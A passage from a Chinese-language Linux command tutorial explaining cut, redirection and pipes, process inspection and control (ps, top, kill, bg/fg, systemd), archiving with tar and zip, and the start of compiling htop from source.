class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cut</span> -c <span class="hljs-number">2</span>-<span class="hljs-number">4</span> name.txt # 剪切每一行第二到第四个字符<br></code></pre></td></tr></table></figure><p><strong>常用参数</strong></p><ul><li><code>-d</code> 用于指定用什么分隔符（比如逗号、分号、双引号等等）<code>cut -d , name.txt</code> ； </li><li><code>-f</code> 表示剪切下用分隔符分割的哪一块或哪几块区域，<code>cut -d , -f 1 name.txt</code> 。 </li></ul><p><strong>重定向 管道 流</strong></p><p>在 Linux 中一个命令的去向可以有3个地方：终端、文件、作为另外一个命令的入参。</p><p><img src="640wx_fmt=jpeg&random=0.11293268100917353&random=0.5947480581080269&random=0.jpeg" alt="图片"></p><p>命令一般都是通过键盘输入，然后输出到终端、文件等地方，它的标准用语是 stdin 、 stdout 以及 stderr 。</p><ul><li>标准输入 <code>stdin</code> ，终端接收键盘输入的命令，会产生两种输出； </li><li>标准输出 <code>stdout</code> ，终端输出的信息（不包含错误信息）； </li><li>标准错误输出 <code>stderr</code> ，终端输出的错误信息。</li></ul><p><img src="640wx_fmt=jpeg&random=0.21886353549193416&random=0.6957152342347532&random=0.jpeg" alt="图片"></p><p><strong>重定向</strong></p><p>把本来要显示在终端的命令结果，输送到别的地方（到文件中或者作为其他命令的输入）。</p><p><strong>输出重定向 &gt;</strong> </p><p><code>&gt;</code> 表示重定向到新的文件，<code>cut -d , -f 1 notes.csv &gt; name.csv</code> ，它表示通过逗号剪切 <code>notes.csv</code> 文件（剪切完有3个部分）获取第一个部分，重定向到 <code>name.csv</code> 文件。</p><p>我们来看一个具体示例，学习它的使用，假设我们有一个文件 <code>notes.csv</code> ，文件内容如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Mark1</span>,<span class="hljs-number">951</span>/<span class="hljs-number">100</span>,很不错<span class="hljs-number">1</span><br><span class="hljs-attribute">Mark2</span>,<span class="hljs-number">952</span>/<span class="hljs-number">100</span>,很不错<span class="hljs-number">2</span><br><span class="hljs-attribute">Mark3</span>,<span class="hljs-number">953</span>/<span class="hljs-number">100</span>,很不错<span class="hljs-number">3</span><br><span class="hljs-attribute">Mark4</span>,<span class="hljs-number">954</span>/<span class="hljs-number">100</span>,很不错<span class="hljs-number">4</span><br><span class="hljs-attribute">Mark5</span>,<span class="hljs-number">955</span>/<span class="hljs-number">100</span>,很不错<span class="hljs-number">5</span><br><span class="hljs-attribute">Mark6</span>,<span class="hljs-number">956</span>/<span class="hljs-number">100</span>,很不错<span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><p>执行命令：cut -d , -f 1 notes.csv &gt; name.csv 最后输出如下内容：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">Mark1</span><br>Mark2<br>Mark3<br>Mark4<br>Mark5<br>Mark6<br></code></pre></td></tr></table></figure><p>【注意】使用 <code>&gt;</code> 要注意，如果输出的文件不存在它会新建一个，如果输出的文件已经存在，则会覆盖。因此执行这个操作要非常小心，以免覆盖其它重要文件。</p><p><strong>输出重定向</strong> <code>&gt;&gt;</code> </p><p>表示重定向到文件末尾，因此它不会像 &gt; 命令这么危险，它是追加到文件的末尾（当然如果文件不存在，也会被创建）。 </p><p>再次执行<code>cut -d , -f 1 notes.csv &gt;&gt; name.csv</code>，则会把名字追加到 <code>name.csv</code> 里面。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">Mark1</span><br>Mark2<br>Mark3<br>Mark4<br>Mark5<br>Mark6<br>Mark1<br>Mark2<br>Mark3<br>Mark4<br>Mark5<br>Mark6<br></code></pre></td></tr></table></figure><p>我们平时读的 log 日志文件其实都是用这个命令输出的。</p><p><strong>输出重定向 2&gt;</strong> </p><p>标准错误输出</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cat</span> not_exist_file.csv &gt; <span class="hljs-keyword">res</span>.txt <span class="hljs-number">2</span>&gt; errors.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><ul><li>当我们 <code>cat</code> 一个文件时，会把文件内容打印到屏幕上，这个是标准输出； </li><li>当使用了 <code>&gt; res.txt</code> 时，则不会打印到屏幕，会把标准输出写入文件 <code>res.txt</code> 文件中； </li><li><code>2&gt; errors.log</code> 当发生错误时会写入 <code>errors.log</code> 文件中。 </li></ul><p><strong>输出重定向</strong> <code>2&gt;&gt;</code> </p><p>标准错误输出（追加到文件末尾）同 &gt;&gt; 相似。</p><p><strong>输出重定向</strong> <code>2&gt;&amp;1</code> </p><p>标准输出和标准错误输出都重定向都一个地方</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> not_exist_file.csv &gt; res.txt <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>  # 覆盖输出<br><span class="hljs-attribute">cat</span> not_exist_file.csv &gt;&gt; res.txt <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> # 追加输出<br></code></pre></td></tr></table></figure><p>目前为止，我们接触的命令的输入都来自命令的参数，其实命令的输入还可以来自文件或者键盘的输入。</p><p><img src="640wx_fmt=jpeg&random=0.4840850080413186&random=0.13193035666547415&random=0.jpeg" alt="图片"></p><p><strong>输入重定向</strong> <code>&lt;</code> </p><p><code>&lt;</code> 符号用于指定命令的输入。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> &lt; name.csv <span class="hljs-comment"># 指定命令的输入为 name.csv</span><br></code></pre></td></tr></table></figure><p>虽然它的运行结果与 <code>cat name.csv</code> 一样，但是它们的原理却完全不同。</p><ul><li><code>cat name.csv</code> 表示 <code>cat</code> 命令接收的输入是 <code>notes.csv</code> 文件名，那么要先打开这个文件，然后打印出文件内容。 </li><li><code>cat &lt; name.csv</code> 表示 <code>cat</code> 命令接收的输入直接是 <code>notes.csv</code> 这个文件的内容， <code>cat</code> 命令只负责将其内容打印，打开文件并将文件内容传递给 <code>cat</code> 命令的工作则交给终端完成。 </li></ul><p><strong>输入重定向</strong> <code>&lt;&lt;</code> </p><p>将键盘的输入重定向为某个命令的输入。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sort</span> -n &lt;&lt; <span class="hljs-string">END # 输入这个命令之后，按下回车，终端就进入键盘输入模式，其中END</span>为结束命令（这个可以自定义）<br><br><span class="hljs-built_in">wc</span> -m &lt;&lt; <span class="hljs-string">END # 统计输入的单词</span><br></code></pre></td></tr></table></figure><p><strong>管道</strong> <code>|</code> </p><p>把两个命令连起来使用，一个命令的输出作为另外一个命令的输入，英文是 <code>pipeline</code> ，可以想象一个个水管连接起来，管道算是重定向流的一种。</p><p><img src="640wx_fmt=jpeg&random=0.8668009778721499&random=0.13938900104200735&random=0.jpeg" alt="图片"></p><p>举几个实际用法案例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cut</span> -d , -f 1 name.csv | <span class="hljs-built_in">sort</span> &gt; sorted_name.txt <br><span class="hljs-comment"># 第一步获取到的 name 列表，通过管道符再进行排序，最后输出到sorted_name.txt</span><br><br><span class="hljs-built_in">du</span> | <span class="hljs-built_in">sort</span> -nr | <span class="hljs-built_in">head</span> <br><span class="hljs-comment"># du 表示列举目录大小信息</span><br><span class="hljs-comment"># sort 进行排序,-n 表示按数字排序，-r 表示倒序</span><br><span class="hljs-comment"># head 前10行文件</span><br><br>grep <span class="hljs-built_in">log</span> -Ir /var/log | <span class="hljs-built_in">cut</span> -d : -f 1 | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span><br><span class="hljs-comment"># grep log -Ir /var/log 表示在log文件夹下搜索 /var/log 文本，-r 表示递归，-I 用于排除二进制文件</span><br><span class="hljs-comment"># cut -d : -f 1 表示通过冒号进行剪切，获取剪切的第一部分</span><br><span class="hljs-comment"># sort 进行排序</span><br><span class="hljs-comment"># uniq 进行去重</span><br></code></pre></td></tr></table></figure><p><strong>流</strong></p><p>流并非一个命令，在计算机科学中，流 stream 的含义是比较难理解的，记住一点即可：流就是读一点数据, 处理一点点数据。其中数据一般就是二进制格式。上面提及的重定向或管道，就是把数据当做流去运转的。</p><p>到此我们就接触了，流、重定向、管道等 Linux 高级概念及指令。其实你会发现关于流和管道在其它语言中也有广泛的应用。Angular 中的模板语法中可以使用管道。Node.js 中也有 stream 流的概念。</p><p><strong>查看进程</strong></p><p>在 Windows 中通过 Ctrl + Alt + Delete 快捷键查看软件进程。</p><p><strong>w</strong></p><p>帮助我们快速了解系统中目前有哪些用户登录着，以及他们在干什么。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[root@lion ~]# w<br> <span class="hljs-number">06</span>:<span class="hljs-number">31</span>:<span class="hljs-number">53</span> up <span class="hljs-number">25</span> days,  <span class="hljs-number">9</span>:<span class="hljs-number">53</span>,  <span class="hljs-number">1</span> <span class="hljs-keyword">user</span>,  <span class="hljs-keyword">load</span> average: <span class="hljs-number">0.00</span>, <span class="hljs-number">0.01</span>, <span class="hljs-number">0.05</span><br><span class="hljs-keyword">USER</span>     TTY      <span class="hljs-keyword">FROM</span>             <span class="hljs-keyword">LOGIN</span>@   IDLE   JCPU   PCPU WHAT<br>root     pts/<span class="hljs-number">0</span>    <span class="hljs-number">118.31</span><span class="hljs-number">.243</span><span class="hljs-number">.53</span>    <span class="hljs-number">05</span>:<span class="hljs-number">56</span>    <span class="hljs-number">1.00</span>s  <span class="hljs-number">0.02</span>s  <span class="hljs-number">0.00</span>s w<br> <br><span class="hljs-number">06</span>:<span class="hljs-number">31</span>:<span class="hljs-number">53</span>：表示当前时间<br>up <span class="hljs-number">25</span> days, <span class="hljs-number">9</span>:<span class="hljs-number">53</span>：表示系统已经正常运行了“<span class="hljs-number">25</span>天<span class="hljs-number">9</span>小时<span class="hljs-number">53</span>分钟”<br><span class="hljs-number">1</span> <span class="hljs-keyword">user</span>：表示一个用户<br><span class="hljs-keyword">load</span> average: <span class="hljs-number">0.00</span>, <span class="hljs-number">0.01</span>, <span class="hljs-number">0.05</span>：表示系统的负载，<span class="hljs-number">3</span>个值分别表示“<span class="hljs-number">1</span>分钟的平均负载”，“<span class="hljs-number">5</span>分钟的平均负载”，“<span class="hljs-number">15</span>分钟的平均负载”<br><br> <span class="hljs-keyword">USER</span>：表示登录的用于<br> TTY：登录的终端名称为pts/<span class="hljs-number">0</span><br> <span class="hljs-keyword">FROM</span>：连接到服务器的ip地址<br> <span class="hljs-keyword">LOGIN</span>@：登录时间<br> IDLE：用户有多久没有活跃了<br> JCPU：该终端所有相关的进程使用的 CPU 时间，每当进程结束就停止计时，开始新的进程则会重新计时<br> PCPU：表示 CPU 执行当前程序所消耗的时间，当前进程就是在 WHAT 列里显示的程序<br> WHAT：表示当下用户正运行的程序是什么，这里我运行的是 w<br></code></pre></td></tr></table></figure><p><strong>ps</strong></p><p>用于显示当前系统中的进程， ps 命令显示的进程列表不会随时间而更新，是静态的，是运行 ps 命令那个时刻的状态或者说是一个进程快照。</p><p><strong>基础语法</strong></p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dos">[root@lion ~]# ps<br>  PID TTY          <span class="hljs-built_in">TIME</span> <span class="hljs-built_in">CMD</span><br> <span class="hljs-number">1793</span> pts/<span class="hljs-number">0</span>    <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> bash<br> <span class="hljs-number">4756</span> pts/<span class="hljs-number">0</span>    <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> ps<br> <br> PID：进程号，每个进程都有唯一的进程号<br> TTY：进程运行所在的终端<br> <span class="hljs-built_in">TIME</span>：进程运行时间<br> <span class="hljs-built_in">CMD</span>：产生这个进程的程序名，如果在进程列表中看到有好几行都是同样的程序名，那么就是同样的程序产生了不止一个进程<br></code></pre></td></tr></table></figure><p><strong>常用参数</strong></p><ul><li><code>-ef</code> 列出所有进程； </li><li><code>-efH</code> 以乔木状列举出所有进程；</li><li><code>-u</code> 列出此用户运行的进程；</li><li><code>-aux</code> 通过 <code>CPU</code> 和内存使用来过滤进程 <code>ps -aux | less</code> ; </li><li><code>-aux --sort -pcpu</code> 按 <code>CPU</code> 使用降序排列，<code>-aux --sort -pmem</code> 表示按内存使用降序排列; </li><li><code>-axjf</code> 以树形结构显示进程， <code>ps -axjf</code> 它和 <code>pstree</code> 效果类似。 </li></ul><p><strong>top</strong></p><p>获取进程的动态列表。</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs tap">top - 07:20:07 up<span class="hljs-number"> 25 </span>days, 10:41, <span class="hljs-number"> 1 </span>user,  load average: 0.30, 0.10, 0.07<br>Tasks: <span class="hljs-number"> 67 </span>total,  <span class="hljs-number"> 1 </span>running, <span class="hljs-number"> 66 </span>sleeping,  <span class="hljs-number"> 0 </span>stopped,  <span class="hljs-number"> 0 </span>zombie<br>%Cpu(s):  0.7 us,  0.3 sy,  0.0 ni, 99.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st<br>KiB Mem : <span class="hljs-number"> 1882072 </span>total,  <span class="hljs-number"> 552148 </span>free,  <span class="hljs-number"> 101048 </span>used, <span class="hljs-number"> 1228876 </span>buff/cache<br>KiB Swap:       <span class="hljs-number"> 0 </span>total,       <span class="hljs-number"> 0 </span>free,       <span class="hljs-number"> 0 </span>used. <span class="hljs-number"> 1594080 </span>avail Mem <br><br>  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND                                                                                                       <br> <span class="hljs-number"> 956 </span>root     <span class="hljs-number"> 10 </span>-10 <span class="hljs-number"> 133964 </span><span class="hljs-number"> 15848 </span><span class="hljs-number"> 10240 </span>S  0.7  0.8 263:13.01 AliYunDun                                                                                                     <br>   <span class="hljs-number"> 1 </span>root     <span class="hljs-number"> 20 </span> <span class="hljs-number"> 0 </span> <span class="hljs-number"> 51644 </span> <span class="hljs-number"> 3664 </span> <span class="hljs-number"> 2400 </span>S  0.0  0.2   3:23.63 systemd                                                                                                       <br>   <span class="hljs-number"> 2 </span>root     <span class="hljs-number"> 20 </span> <span class="hljs-number"> 0 </span>     <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>S  0.0  0.0   0:00.05 kthreadd                                                                                                      <br>   <span class="hljs-number"> 4 </span>root      <span class="hljs-number"> 0 </span>-20      <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>S  0.0  0.0   0:00.00 kworker/0:0H<br></code></pre></td></tr></table></figure><ul><li><code>top - 07:20:07 up 25 days, 10:41,  1 user,  load average: 0.30, 0.10, 0.07</code> 相当 <code>w</code> 命令的第一行的信息。 </li><li>展示的这些进程是按照使用处理器 <code>%CPU</code> 的使用率来排序的。 </li></ul><p><strong>kill</strong></p><p>结束一个进程，<code>kill + PID</code> 。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kill</span> <span class="hljs-number">956</span> # 结束进程号为<span class="hljs-number">956</span>的进程<br><span class="hljs-attribute">kill</span> <span class="hljs-number">956</span> <span class="hljs-number">957</span> # 结束多个进程<br><span class="hljs-attribute">kill</span> -<span class="hljs-number">9</span> <span class="hljs-number">7291</span> # 强制结束进程<br></code></pre></td></tr></table></figure><p><strong>管理进程</strong></p><p><strong>进程状态</strong></p><p>主要是切换进程的状态。我们先了解下 Linux 下进程的五种状态：</p><ol><li>状态码 R ：表示正在运行的状态； </li><li>状态码 S ：表示中断（休眠中，受阻，当某个条件形成后或接受到信号时，则脱离该状态）； </li><li>状态码 D ：表示不可中断（进程不响应系统异步信号，即使用kill命令也不能使其中断）； </li><li>状态码 Z ：表示僵死（进程已终止，但进程描述符依然存在，直到父进程调用 wait4() 系统函数后将进程释放）； </li><li>状态码 T ：表示停止（进程收到 SIGSTOP 、 SIGSTP 、 SIGTIN 、 SIGTOU 等停止信号后停止运行）。 </li></ol><p><strong>前台进程 &amp; 后台进程</strong></p><p>默认情况下，用户创建的进程都是前台进程，前台进程从键盘读取数据，并把处理结果输出到显示器。例如运行 top 命令，这就是一个一直运行的前台进程。</p><p>后台进程的优点是不必等待程序运行结束，就可以输入其它命令。在需要执行的命令后面添加 &amp; 符号，就表示启动一个后台进程。</p><p><strong>&amp;</strong></p><p>启动后台进程，它的缺点是后台进程与终端相关联，一旦关闭终端，进程就自动结束了。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">cp <span class="hljs-type">name</span>.csv <span class="hljs-type">name</span>-<span class="hljs-keyword">copy</span>.csv &amp;<br></code></pre></td></tr></table></figure><p><strong>nohup</strong></p><p>使进程不受挂断（关闭终端等动作）的影响。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">nohup cp <span class="hljs-type">name</span>.csv <span class="hljs-type">name</span>-<span class="hljs-keyword">copy</span>.csv<br></code></pre></td></tr></table></figure><p>nohup 命令也可以和 &amp; 结合使用。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">nohup cp <span class="hljs-type">name</span>.csv <span class="hljs-type">name</span>-<span class="hljs-keyword">copy</span>.csv &amp;<br></code></pre></td></tr></table></figure><p><strong>bg</strong></p><p>使一个“后台暂停运行”的进程，状态改为“后台运行”。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">bg</span> %1 <span class="hljs-comment"># 不加任何参数的情况下，bg命令会默认作用于最近的一个后台进程，如果添加参数则会作用于指定标号的进程</span><br></code></pre></td></tr></table></figure><p>实际案例1：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. 执行 grep -r <span class="hljs-string">&quot;log&quot;</span> / &gt; grep_log <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> 命令启动一个前台进程，并且忘记添加 &amp; 符号<br><span class="hljs-attribute">2</span>. ctrl + z 使进程状态转为后台暂停<br><span class="hljs-attribute">3</span>. 执行 bg 将命令转为后台运行             <br></code></pre></td></tr></table></figure><p>实际案例2：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">前端开发时我们经常会执行 yarn start 启动项目<br>此时我们执行 ctrl + z 先使其暂停<br>然后执行 <span class="hljs-built_in">bg</span> 使其转为后台运行<br>这样当前终端就空闲出来可以干其它事情了，如果想要唤醒它就使用 <span class="hljs-built_in">fg</span> 命令即可（后面会讲）<br></code></pre></td></tr></table></figure><p><strong>jobs</strong></p><p>显示当前终端后台进程状态。</p><p><strong>fg</strong></p><p>fg 使进程转为前台运行，用法和 bg 命令类似。</p><p>我们用一张图来表示前后台进程切换：</p><p><img src="640wx_fmt=jpeg&random=0.9200554254980926&random=0.16042377588978307&random=0.jpeg" alt="图片"></p><p>我们可以使程序在后台运行，成为后台进程，这样在当前终端中我们就可以做其他事情了，而不必等待此进程运行结束。</p><p><strong>守护进程</strong></p><p>一个运行起来的程序被称为进程。在 Linux 中有些进程是特殊的，它不与任何进程关联，不论用户的身份如何，都在后台运行，这些进程的父进程是 PID 为1的进程， PID 为1的进程只在系统关闭时才会被销毁。它们会在后台一直运行等待分配工作。我们将这类进程称之为守护进程 daemon 。</p><p>守护进程的名字通常会在最后有一个 d ，表示 daemon 守护的意思，例如 systemd 、httpd 。</p><p><strong>systemd</strong></p><p>systemd 是一个 Linux 系统基础组件的集合，提供了一个系统和服务管理器，运行为 PID 1 并负责启动其它程序。</p><p>通过命令也可以看到 PID 为1的进程就是 systemd 的系统进程。</p><p>systemd 常用命令（它是一组命令的集合）：</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">systemctl</span> <span class="hljs-string">start</span> <span class="hljs-string">nginx</span> <span class="hljs-comment"># 启动服务</span><br><span class="hljs-string">systemctl</span> <span class="hljs-string">stop</span> <span class="hljs-string">nginx</span> <span class="hljs-comment"># 停止服务</span><br><span class="hljs-string">systemctl</span> <span class="hljs-string">restart</span> <span class="hljs-string">nginx</span> <span class="hljs-comment"># 重启服务</span><br><span class="hljs-string">systemctl</span> <span class="hljs-string">status</span> <span class="hljs-string">nginx</span> <span class="hljs-comment"># 查看服务状态</span><br><span class="hljs-string">systemctl</span> <span class="hljs-string">reload</span> <span class="hljs-string">nginx</span> <span class="hljs-comment"># 重载配置文件(不停止服务的情况)</span><br><span class="hljs-string">systemctl</span> <span class="hljs-string">enable</span> <span class="hljs-string">nginx</span> <span class="hljs-comment"># 开机自动启动服务</span><br><span class="hljs-string">systemctl</span> <span class="hljs-string">disable</span> <span class="hljs-string">nginx</span> <span class="hljs-comment"># 开机不自动启动服务</span><br><span class="hljs-string">systemctl</span> <span class="hljs-string">is-enabled</span> <span class="hljs-string">nginx</span> <span class="hljs-comment"># 查看服务是否开机自动启动</span><br><span class="hljs-string">systemctl</span> <span class="hljs-built_in">list-unit-files</span> <span class="hljs-built_in">--type=service</span> <span class="hljs-comment"># 查看各个级别下服务的启动和禁用情况</span><br></code></pre></td></tr></table></figure><p><strong>文件压缩解压</strong></p><ul><li><strong>打包</strong>：是将多个文件变成一个总的文件，它的学名叫存档、归档。 </li><li><strong>压缩</strong>：是将一个大文件（通常指归档）压缩变成一个小文件。 </li></ul><p>我们常常使用 tar 将多个文件归档为一个总的文件，称为 archive 。然后用 gzip 或 bzip2 命令将 archive 压缩为更小的文件。</p><p><img src="640wx_fmt=jpeg&random=0.4558983160453647&random=0.8917503277603893&random=0.jpeg" alt="图片"></p><p><strong>tar</strong></p><p>创建一个 <code>tar</code> 归档。</p><p><strong>基础用法</strong></p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dos">tar -cvf <span class="hljs-built_in">sort</span>.tar <span class="hljs-built_in">sort</span>/ # 将<span class="hljs-built_in">sort</span>文件夹归档为<span class="hljs-built_in">sort</span>.tar<br>tar -cvf archive.tar file1 file2 file3 # 将 file1 file2 file3 归档为archive.tar<br></code></pre></td></tr></table></figure><p><strong>常用参数</strong></p><ul><li><code>-cvf</code> 表示 create（创建）+ verbose（细节）+ file（文件），创建归档文件并显示操作细节； </li><li><code>-tf</code> 显示归档里的内容，并不解开归档； </li><li><code>-rvf</code> 追加文件到归档，<code>tar -rvf archive.tar file.txt</code> ； </li><li><code>-xvf</code> 解开归档，<code>tar -xvf archive.tar</code> 。 </li></ul><p><strong>gzip / gunzip</strong></p><p>“压缩/解压”归档，默认用 <code>gzip</code> 命令，压缩后的文件后缀名为 <code>.tar.gz</code> 。</p><p><strong>tar 归档+压缩</strong></p><p>可以用 tar 命令同时完成归档和压缩的操作，就是给 tar 命令多加一个选项参数，使之完成归档操作后，还是调用 <code>gzip</code> 或 <code>bzip2</code> 命令来完成压缩操作。</p><p><strong>zcat、zless、zmore</strong></p><p>之前讲过使用 <code>cat less more</code> 可以查看文件内容，但是压缩文件的内容是不能使用这些命令进行查看的，而要使用 <code>zcat、zless、zmore</code> 进行查看。</p><p><strong>zip/unzip</strong></p><p>“压缩/解压” zip 文件（ zip 压缩文件一般来自 windows 操作系统）。</p><p><strong>命令安装</strong></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-comment"># Red Hat 一族中的安装方式</span><br>yum <span class="hljs-keyword">install</span> zip <br>yum <span class="hljs-keyword">install</span> unzip <br></code></pre></td></tr></table></figure><p>基础用法</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata">unzip archive.<span class="hljs-keyword">zip</span> # 解压 .<span class="hljs-keyword">zip</span> 文件<br>unzip -<span class="hljs-keyword">l</span> archive.<span class="hljs-keyword">zip</span> # 不解开 .<span class="hljs-keyword">zip</span> 文件，只看其中内容<br><br><span class="hljs-keyword">zip</span> -r <span class="hljs-keyword">sort</span>.<span class="hljs-keyword">zip</span> <span class="hljs-keyword">sort</span>/ # 将<span class="hljs-keyword">sort</span>文件夹压缩为 <span class="hljs-keyword">sort</span>.<span class="hljs-keyword">zip</span>，其中-r表示递归                    <br></code></pre></td></tr></table></figure><p><strong>编译安装软件</strong></p><p>之前我们学会了使用 <code>yum</code> 命令进行软件安装，如果碰到 <code>yum</code> 仓库中没有的软件，我们就需要会更高级的软件安装“源码编译安装”。</p><p><strong>编译安装</strong></p><p>简单来说，编译就是将程序的源代码转换成可执 <code>yum</code> 行文件的过程。大多数 Linux 的程序都是开放源码的，可以编译成适合我们的电脑和操纵系统属性的可执行文件。</p><p>基本步骤如下：</p><ol><li>下载源代码 </li><li>解压压缩包 </li><li>配置 </li><li>编译 </li><li>安装 </li></ol><p><strong>实际案例</strong></p><p><strong>1、下载</strong></p><p>我们来编译安装 htop 软件，首先在它的官网下载源码：<a href="https://bintray.com/htop/source/htop#files">https://bintray.com/htop/source/htop#files</a></p><p>下载好的源码在本机电脑上使用如下命令同步到服务器上：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">scp</span> 文件名 用户名@服务器ip:目标路径<br><br><span class="hljs-attribute">scp</span> ~/Desktop/htop-<span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.tar.gz root@<span class="hljs-number">121.42.11.34</span>:.<br></code></pre></td></tr></table></figure><p>也可以使用 wegt 进行下载：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">wegt+下载地址<br><br>wegt https:<span class="hljs-regexp">//</span>bintray.com<span class="hljs-regexp">/htop/</span>source/download_file?file_path=htop-<span class="hljs-number">3.0</span>.<span class="hljs-number">0</span>.tar.gz<br></code></pre></td></tr></table></figure><p><strong>2、解压文件</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> -zxvf htop-<span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.tar.gz # 解压<br><br><span class="hljs-attribute">cd</span> htop-<span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> # 